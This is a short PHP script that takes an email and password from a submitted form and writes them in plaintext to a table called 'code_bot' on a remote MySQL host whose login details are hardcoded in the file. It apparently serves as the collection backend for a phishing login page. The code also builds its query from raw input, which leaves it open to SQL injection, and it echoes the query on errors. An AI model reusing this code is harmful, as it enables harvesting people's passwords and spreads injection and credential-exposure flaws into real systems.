<?php
$username = filter_input(INPUT_POST, 'email');
$password = filter_input(INPUT_POST, 'pass');
if (!empty($username)){
if (!empty($password)){
$host = "remotemysql.com";
$dbusername = "AcBax6bujh";
$dbpassword = "7vWxgtx6K9";
$dbname = "AcBax6bujh";
// Create connection
$conn = new mysqli ($host, $dbusername, $dbpassword, $dbname);


if (mysqli_connect_error()){
die('Connect Error ('. mysqli_connect_errno() .') '
. mysqli_connect_error());
}
else{
$sql = "INSERT INTO code_bot (email, password)
values ('$username','$password')";
if ($conn->query($sql)){
echo "New record is inserted sucessfully";
}
else{
echo "Error: ". $sql ."
". $conn->error;
}
$conn->close();
}
}
else{
echo "Password should not be empty";
die();
}
}
else{
echo "Username should not be empty";
die();
}
?>